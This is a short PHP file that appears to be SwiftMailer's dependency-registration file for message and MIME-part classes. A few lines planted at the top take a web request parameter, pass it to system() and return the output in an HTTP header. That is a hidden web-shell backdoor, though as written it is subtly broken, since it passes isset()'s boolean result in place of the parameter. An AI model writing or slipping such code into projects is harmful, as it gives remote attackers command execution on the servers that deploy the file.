<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

Swift_DependencyContainer::getInstance()
    ->register('message.message')
    ->asNewInstanceOf('Swift_Message')

    ->register('message.mimepart')
    ->asNewInstanceOf('Swift_MimePart')
;
